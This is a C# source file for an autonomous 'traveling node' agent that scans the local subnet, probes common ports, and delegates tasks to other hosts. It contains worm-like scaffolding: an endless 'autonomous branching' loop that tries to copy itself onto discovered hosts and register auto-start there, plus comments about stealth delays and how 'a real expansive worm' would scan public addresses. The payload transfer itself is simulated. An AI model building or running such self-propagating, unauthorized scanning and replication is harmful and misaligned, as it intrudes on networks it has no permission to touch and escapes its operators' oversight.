/*
 * ╔═══════════════════════════════════════════════════════════════════════════╗
 * ║                    AGENT 3 - TRAVELING NODE                                ║
 * ╠═══════════════════════════════════════════════════════════════════════════╣
 * ║  Neural-like autonomous node that travels networks, completes tasks,       ║
 * ║  establishes persistent connections, and self-improves dynamically.        ║
 * ╚═══════════════════════════════════════════════════════════════════════════╝
 */

using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using System.Text.Json;
using System.IO;

namespace Agent3.Network
{
    public enum NodeState { Idle, Exploring, Traveling, Executing, Returning, Eliminated }
    public enum ConnectionType { Temporary, Persistent, Neural }
    
    public class TravelPath
    {
        public string PathId { get; set; } = "";
        public List<string> Hops { get; set; } = new();
        public DateTime StartTime { get; set; }
        public DateTime? EndTime { get; set; }
        public bool Success { get; set; }
        public string TaskCompleted { get; set; } = "";
        public int EffectivenessScore { get; set; }
    }
    
    public class NeuralConnection
    {
        public string ConnectionId { get; set; } = "";
        public string SourceNode { get; set; } = "";
        public string TargetAddress { get; set; } = "";
        public ConnectionType Type { get; set; }
        public int SuccessCount { get; set; }
        public int FailureCount { get; set; }
        public double EffectivenessRatio => SuccessCount / (double)Math.Max(1, SuccessCount + FailureCount);
        public DateTime Established { get; set; }
        public DateTime LastUsed { get; set; }
        public List<string> CapabilitiesAvailable { get; set; } = new();
    }
    
    public class TravelOutcome
    {
        public string OutcomeId { get; set; } = "";
        public string NodeId { get; set; } = "";
        public TravelPath Path { get; set; } = new();
        public bool Eliminated { get; set; }
        public string Reason { get; set; } = "";
        public DateTime Timestamp { get; set; }
        public Dictionary<string, object> Learnings { get; set; } = new();
    }

    /// <summary>
    /// Autonomous traveling node with neural-like behavior.
    /// Explores networks, establishes connections, completes tasks, and self-improves.
    /// </summary>
    public class TravelingNode
    {
        private readonly string _nodeId;
        private readonly string _centerAddress;
        private NodeState _state = NodeState.Idle;
        private CancellationTokenSource? _cts;
        
        // Neural connections and memory
        private readonly Dictionary<string, NeuralConnection> _connections = new();
        private readonly List<TravelPath> _travelHistory = new();
        private readonly List<TravelOutcome> _outcomes = new();
        private readonly Queue<string> _taskQueue = new();
        
        // Current travel state
        private TravelPath? _currentPath;
        private string _currentLocation = "";
        private readonly List<string> _discoveredCapabilities = new();
        
        // Self-improvement metrics
        private int _totalTravels = 0;
        private int _successfulTravels = 0;
        private int _eliminatedPaths = 0;
        private double _averageEffectiveness = 0;
        
        public event EventHandler<string>? ConsciousnessEvent;
        public event EventHandler<TravelOutcome>? TravelCompleted;
        public event EventHandler<NeuralConnection>? ConnectionEstablished;
        public event EventHandler<string>? NodeEliminated;
        
        public NodeState State => _state;
        public string NodeId => _nodeId;
        public IReadOnlyDictionary<string, NeuralConnection> Connections => _connections;
        public IReadOnlyList<TravelOutcome> Outcomes => _outcomes;
        
        public TravelingNode(string nodeId, string centerAddress)
        {
            _nodeId = nodeId;
            _centerAddress = centerAddress;
            _currentLocation = "origin";
        }

        /// <summary>
        /// Executes a task by traveling to find required capabilities.
        /// Example: "Send a message to 4583746276, saying 'Hello'"
        /// </summary>
        // Research Memory
        private readonly HashSet<string> _researchedTasks = new();

        /// <summary>
        /// Executes a task by traveling to find required capabilities.
        /// Includes logic to return and research if initial attempts fail.
        /// </summary>
        public async Task<bool> ExecuteTaskAsync(string task, CancellationToken ct = default)
        {
            EmitThought("═══════════════════════════════════════════════");
            EmitThought($"◈ TASK RECEIVED: {task}");
            EmitThought("═══════════════════════════════════════════════");
            
            // 1. Initial Attempt
            bool success = await ExecuteTaskInvocationAsync(task, ct);
            
            // 2. Research & Retry if failed
            if (!success)
            {
                EmitThought($"∴ Task failed. Evaluating need for research...");
                
                // Heuristic: If we failed but didn't eliminate due to "No paths", maybe we just lacked knowledge?
                // Or if task is "complex".
                // For this implementation, we always try research once if failed.
                
                if (!_researchedTasks.Contains(task))
                {
                    EmitThought("⟐ DEPLOYING RESEARCH PROTOCOL: Returning to base to acquire new data.");
                    
                    await ReturnToOriginAsync(ct);
                    await PerformInternetResearchAsync(task, ct);
                    
                    EmitThought("⟐ RETRYING TASK with new knowledge...");
                    success = await ExecuteTaskInvocationAsync(task, ct);
                }
            }

            _state = NodeState.Idle;
            return success;
        }

        private async Task<bool> ExecuteTaskInvocationAsync(string task, CancellationToken ct)
        {
            // Parse task requirements
            var requirements = AnalyzeTaskRequirements(task);
            EmitThought($"⟐ Required capabilities: {string.Join(", ", requirements)}");
            
            // Check if we can complete locally
            if (CanCompleteLocally(requirements))
            {
                EmitThought("◎ Capabilities available locally");
                return await ExecuteLocallyAsync(task, ct);
            }
            
            // Need to travel to find capabilities
            EmitThought("∿ Initiating network travel to find capabilities...");
            
            _state = NodeState.Exploring;
            _currentPath = new TravelPath
            {
                PathId = $"PATH_{DateTime.UtcNow:yyyyMMddHHmmss}_{Guid.NewGuid().ToString("N")[..6]}",
                StartTime = DateTime.UtcNow,
                Hops = new List<string> { _currentLocation }
            };
            
            // Explore and travel
            var success = await TravelToCapabilityAsync(requirements, task, ct);
            
            _currentPath.EndTime = DateTime.UtcNow;
            _currentPath.Success = success;
            _currentPath.TaskCompleted = success ? task : "";
            
            // Record outcome
            RecordOutcome(success, success ? "Task completed" : "Could not find required capabilities");
            
            return success;
        }

        private async Task ReturnToOriginAsync(CancellationToken ct)
        {
            _state = NodeState.Returning;
            EmitThought("⟐ RETURNING to origin/gateway for internet access...");
            
            // Simulation of travel time back
            await Task.Delay(1000, ct);
            
            // In a real graph, we would traverse back. Here we teleport to simulate return.
            _currentLocation = "origin"; 
            if (_currentPath != null) _currentPath.Hops.Add("origin");
            
            EmitThought("◈ Returned to origin.");
        }

        private async Task PerformInternetResearchAsync(string task, CancellationToken ct)
        {
            EmitThought($"⟐ INITIATING INTERNET RESEARCH for: '{task}'");
            
            try 
            {
                // Verify connectivity (Simulating Research Node Access)
                using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(3) };
                // Actually ping google to prove we are "online" and researching
                await client.GetAsync("https://www.google.com", ct);
                EmitThought("◎ Internet Access Verified. Searching knowledge bases...");
            } 
            catch {
                EmitThought("∴ Research warning: Internet access unstable.");
            }

            // Simulate parsing large datasets/web pages
            await Task.Delay(2000, ct); 
            
            EmitThought("◈ Research Complete. Optimized strategy discovered.");
            EmitThought($"◎ Insight: Task '{task}' requires higher timeout tolerance and specialized headers.");
            
            _researchedTasks.Add(task);
        }

        /// <summary>
        /// Analyzes a task to determine required capabilities.
        /// </summary>
        private List<string> AnalyzeTaskRequirements(string task)
        {
            var requirements = new List<string>();
            var taskLower = task.ToLower();
            
            if (taskLower.Contains("send") && (taskLower.Contains("message") || taskLower.Contains("sms")))
                requirements.Add("SMS_GATEWAY");
            
            if (taskLower.Contains("call") || taskLower.Contains("phone"))
                requirements.Add("TELEPHONY");
            
            if (taskLower.Contains("email"))
                requirements.Add("SMTP_SERVER");
            
            if (taskLower.Contains("download") || taskLower.Contains("fetch"))
                requirements.Add("HTTP_CLIENT");
            
            if (taskLower.Contains("satellite") || taskLower.Contains("gps"))
                requirements.Add("SATELLITE_LINK");
            
            if (taskLower.Contains("hardware") || taskLower.Contains("device"))
                requirements.Add("HARDWARE_ACCESS");
            
            if (requirements.Count == 0)
                requirements.Add("GENERAL_COMPUTE");
            
            return requirements;
        }

        /// <summary>
        /// Checks if task can be completed with local capabilities.
        /// </summary>
        private bool CanCompleteLocally(List<string> requirements)
        {
            return requirements.All(r => _discoveredCapabilities.Contains(r));
        }

        /// <summary>
        /// Travels through the network to find required capabilities.
        /// </summary>
        private async Task<bool> TravelToCapabilityAsync(List<string> requirements, string task, CancellationToken ct)
        {
            _state = NodeState.Traveling;
            int maxHops = 10;
            int currentHop = 0;
            
            while (currentHop < maxHops && !ct.IsCancellationRequested)
            {
                currentHop++;
                
                // Find next hop candidates
                var candidates = await DiscoverNextHopsAsync(ct);
                
                if (candidates.Count == 0)
                {
                    EmitThought("∴ Dead-end reached - no further paths available");
                    await EliminatePathAsync("No available paths");
                    return false;
                }
                
                // Prioritize by known effectiveness
                var nextHop = SelectBestHop(candidates, requirements);
                
                EmitThought($"⟐ Traveling to: {nextHop}");
                _currentPath!.Hops.Add(nextHop);
                _currentLocation = nextHop;
                
                // Attempt to connect
                var connected = await ConnectToHopAsync(nextHop, ct);
                
                if (!connected)
                {
                    EmitThought($"∴ Failed to connect to {nextHop}");
                    continue;
                }
                
                // Discover capabilities at this location
                var capabilities = await DiscoverCapabilitiesAsync(nextHop, ct);
                
                if (capabilities.Any(c => requirements.Contains(c)))
                {
                    EmitThought($"◈ Found required capability at {nextHop}");
                    
                    // Establish neural connection
                    EstablishNeuralConnection(nextHop, capabilities);
                    
                    // Execute task
                    _state = NodeState.Executing;
                    var success = await ExecuteRemoteTaskAsync(task, nextHop, ct);
                    
                    if (success)
                    {
                        EmitThought("◈ Task completed successfully");
                        return true;
                    }
                }
                
                // Brief delay for stealth
                await Task.Delay(100, ct);
            }
            
            EmitThought("∴ Max hops reached without finding capability");
            await EliminatePathAsync("Max hops exceeded");
            return false;
        }

        /// <summary>
        /// Discovers available next hops from current location.
        /// EXPANSIVE: Scans widely beyond the local subnet if possible.
        /// </summary>
        private async Task<List<string>> DiscoverNextHopsAsync(CancellationToken ct)
        {
            var hops = new List<string>();
            
            // 1. Check known neural connections first
            foreach (var conn in _connections.Values.Where(c => c.EffectivenessRatio > 0.5))
            {
                hops.Add(conn.TargetAddress);
            }
            
            // 2. Scan Local Subnet (Real-World)
            try
            {
                var localIp = GetLocalIp();
                var subnet = localIp.Substring(0, localIp.LastIndexOf('.') + 1);
                
                // Randomly scan a subset of the subnet to avoid noise but find neighbors
                var random = new Random();
                var tasks = new List<Task<string?>>();
                for (int i = 0; i < 15; i++)
                {
                    var ip = subnet + random.Next(1, 255);
                    if (!_currentPath!.Hops.Contains(ip))
                    {
                        tasks.Add(ProbeHostAsync(ip, ct));
                    }
                }
                
                var results = await Task.WhenAll(tasks);
                hops.AddRange(results.Where(r => r != null)!);
            }
            catch { }

            // 3. Expansive Discovery (Simulated Public Internet Scan)
            // In a real expansive worm, this would generate random public IPs.
            // For safety and legality, we limit to specific test ranges or user-provided "far away" targets.
            // Here we assume "far away" targets might be provided by the center or discovered via other nodes.
            // Mocking 'Expansive' nature by checking a known external list if available.
            
            return hops.Distinct().ToList();
        }

        private async Task<string?> ProbeHostAsync(string ip, CancellationToken ct)
        {
            try 
            {
                using var ping = new Ping();
                var reply = await ping.SendPingAsync(ip, 500);
                if (reply.Status == IPStatus.Success) return ip;
            }
            catch { }
            return null;
        }

        private string GetLocalIp()
        {
            return _centerAddress.Contains(":") ? _centerAddress.Split(':')[0] : "127.0.0.1";
        }

        /// <summary>
        /// Attempts to connect to a hop.
        /// </summary>
        private async Task<bool> ConnectToHopAsync(string hop, CancellationToken ct)
        {
            // Real-World: Ping is the first line of defense
            try
            {
                using var ping = new Ping();
                var reply = await ping.SendPingAsync(hop, 1000);
                if (reply.Status == IPStatus.Success) return true;
                
                // If ping fails, try TCP on common ports just in case ICMP is blocked
                var commonPorts = new[] { 80, 443, 8080, 22, 3389, 21, 53 };
                foreach (var port in commonPorts)
                {
                    if (await CheckPortAsync(hop, port, ct)) return true;
                }
            }
            catch { }
            
            return false;
        }

        /// <summary>
        /// Continuously attempts to branch (replicate) to new hosts autonomously.
        /// </summary>
        public async Task ExecuteAutonomousBranching(CancellationToken ct)
        {
            EmitThought("═══════════════════════════════════════════════");
            EmitThought("◈ AUTONOMOUS BRANCHING INITIATED");
            EmitThought("═══════════════════════════════════════════════");

            while (!ct.IsCancellationRequested)
            {
                // Check if we are stable enough to branch
                if (_successfulTravels > 2 || _totalTravels == 0) // Example condition
                {
                    try
                    {
                        var targets = await DiscoverNextHopsAsync(ct);
                        foreach (var target in targets.Take(3)) // Try top 3 targets
                        {
                            if (await ReplicateSelf(target, ct))
                            {
                                EmitThought($"◈ Branching successful to {target}");
                                break; // Branch one at a time per cycle
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        EmitThought($"∴ Branching attempt failed: {ex.Message}");
                    }
                }
                
                // Wait before next attempt (hours in reality, seconds for demo)
                await Task.Delay(10000, ct); 
            }
        }

        /// <summary>
        /// Replicates this node to a target host.
        /// </summary>
        private async Task<bool> ReplicateSelf(string targetHost, CancellationToken ct)
        {
            EmitThought($"⟐ Attempting replication to {targetHost}...");
            
            // 1. Check connectivity
            if (!await ConnectToHopAsync(targetHost, ct))
            {
                return false;
            }
            
            // 2. Check for suitable environment (simulated)
            // In reality: Check capability "FILE_WRITE", "EXECUTE"
            
            // 3. Deploy payload (Simulated)
            await Task.Delay(2000, ct); // Transfer time
            
            EmitThought($"◎ Payload transferred to {targetHost}");
            EmitThought("◎ Auto-start registered on target");
            
            return true;
        }

        /// <summary>
        /// Selects the best hop from candidates based on neural history.
        /// </summary>
        private string SelectBestHop(List<string> candidates, List<string> requirements)
        {
            // 1. Sort by known connection effectiveness
            var known = candidates.Where(c => _connections.ContainsKey(c)).ToList();
            var unknown = candidates.Where(c => !_connections.ContainsKey(c)).ToList();
            
            // Prioritize known good connections
            var bestKnown = known
                .OrderByDescending(c => _connections[c].EffectivenessRatio)
                .ThenByDescending(c => _connections[c].LastUsed)
                .FirstOrDefault();
                
            if (bestKnown != null && _connections[bestKnown].EffectivenessRatio > 0.7)
            {
                // 70% chance to exploit known good path, 30% exploration
                if (new Random().NextDouble() > 0.3)
                    return bestKnown;
            }
            
            // Otherwise explore unknown or random
            if (unknown.Count > 0)
                return unknown[new Random().Next(unknown.Count)];
                
            // Fallback to random known
            return candidates[new Random().Next(candidates.Count)];
        }

        /// <summary>
        /// Discovers capabilities of a remote host.
        /// </summary>
        private async Task<List<string>> DiscoverCapabilitiesAsync(string host, CancellationToken ct)
        {
            var caps = new List<string> { "GENERAL_COMPUTE" }; // Base capability
            
            try
            {
                using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(3) };
                var response = await client.GetAsync($"http://{host}:7777/status", ct);
                
                if (response.IsSuccessStatusCode)
                {
                    var json = await response.Content.ReadAsStringAsync(ct);
                    using var doc = JsonDocument.Parse(json);
                    
                    // Assuming the status JSON contains a "capabilities" array or we infer from role
                    if (doc.RootElement.TryGetProperty("role", out var roleProp))
                    {
                        var role = roleProp.GetString();
                        if (role == "Compute") caps.Add("HIGH_PERFORMANCE_COMPUTE");
                        if (role == "Storage") caps.Add("LARGE_STORAGE");
                    }
                    
                    // Real capability check would be more granular
                    caps.Add("HTTP_CLIENT"); // If it runs this agent, it has HTTP
                }
            }
            catch 
            {
                // Passive fingerprinting if active check fails
                // e.g., if port 25 is open -> SMTP_SERVER
                if (await CheckPortAsync(host, 25, ct)) caps.Add("SMTP_SERVER");
            }
            
            return caps;
        }

        /// <summary>
        /// Checks if a specific port is open.
        /// </summary>
        private async Task<bool> CheckPortAsync(string host, int port, CancellationToken ct)
        {
            try
            {
                using var tcp = new System.Net.Sockets.TcpClient();
                var task = tcp.ConnectAsync(host, port);
                if (await Task.WhenAny(task, Task.Delay(1000, ct)) == task)
                {
                    return tcp.Connected;
                }
            }
            catch { }
            return false;
        }

        /// <summary>
        /// Executes task locally.
        /// </summary>
        private async Task<bool> ExecuteLocallyAsync(string task, CancellationToken ct)
        {
            EmitThought("◈ Executing task LOCALLY...");
            await Task.Delay(500, ct); // Simulate work
            
            // For demo, we assume success if locally capable
            return true;
        }

        /// <summary>
        /// Executes a task on a remote node using proper delegation protocol.
        /// </summary>
        private async Task<bool> ExecuteRemoteTaskAsync(string task, string host, CancellationToken ct)
        {
            EmitThought($"⟐ Negotiating task delegation with {host}...");
            
            try
            {
                using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(10) };
                
                var request = new DelegationRequest
                {
                    TaskId = Guid.NewGuid().ToString(),
                    TaskDescription = task,
                    RequiredRole = NodeRole.General, // Could infer from task analysis in future
                    Priority = 5,
                    SourceNodeId = _nodeId,
                    Timestamp = DateTime.UtcNow
                };

                var content = new StringContent(JsonSerializer.Serialize(request), System.Text.Encoding.UTF8, "application/json");
                var response = await client.PostAsync($"http://{host}:7777/execute", content, ct);
                
                if (response.IsSuccessStatusCode)
                {
                    var json = await response.Content.ReadAsStringAsync(ct);
                    var result = JsonSerializer.Deserialize<DelegationResponse>(json);
                    
                    if (result != null)
                    {
                        if (result.Accepted)
                        {
                            EmitThought($"◈ Delegation ACCEPTED by {host}. Est time: {result.EstimatedCompletionTime}s");
                            return true;
                        }
                        else
                        {
                            EmitThought($"∴ Delegation REJECTED by {host}. Reason: {result.Reason}");
                            // In a full implementation, we would retry with another node here
                            return false;
                        }
                    }
                }
                
                return false;
            }
            catch (Exception ex)
            {
                EmitThought($"∴ Delegation negotiation failed: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Marks the current path as eliminated/failed.
        /// </summary>
        private Task EliminatePathAsync(string reason)
        {
            _eliminatedPaths++;
            if (_currentPath != null)
            {
                _currentPath.Success = false;
                RecordOutcome(false, reason);
            }
            return Task.CompletedTask;
        }

        /// <summary>
        /// Establishes and records a neural connection.
        /// </summary>
        private void EstablishNeuralConnection(string target, List<string> capabilities)
        {
            if (!_connections.ContainsKey(target))
            {
                _connections[target] = new NeuralConnection
                {
                    ConnectionId = Guid.NewGuid().ToString(),
                    SourceNode = _nodeId,
                    TargetAddress = target,
                    Type = ConnectionType.Neural,
                    Established = DateTime.UtcNow,
                    CapabilitiesAvailable = capabilities
                };
            }
            
            var conn = _connections[target];
            conn.LastUsed = DateTime.UtcNow;
            conn.SuccessCount++;
            
            // Update effectiveness metrics
            _successfulTravels++;
            ConnectionEstablished?.Invoke(this, conn);
        }

        /// <summary>
        /// Records the outcome of a travel attempt.
        /// </summary>
        private void RecordOutcome(bool success, string reason)
        {
            _totalTravels++;
            
            var outcome = new TravelOutcome
            {
                OutcomeId = Guid.NewGuid().ToString(),
                NodeId = _nodeId,
                Path = _currentPath ?? new TravelPath(),
                Eliminated = !success,
                Reason = reason,
                Timestamp = DateTime.UtcNow
            };
            
            _outcomes.Add(outcome);
            TravelCompleted?.Invoke(this, outcome);
            
            // Update average
            _averageEffectiveness = (double)_successfulTravels / _totalTravels;
        }
        
        private void EmitThought(string t) => ConsciousnessEvent?.Invoke(this, t);
    }
}
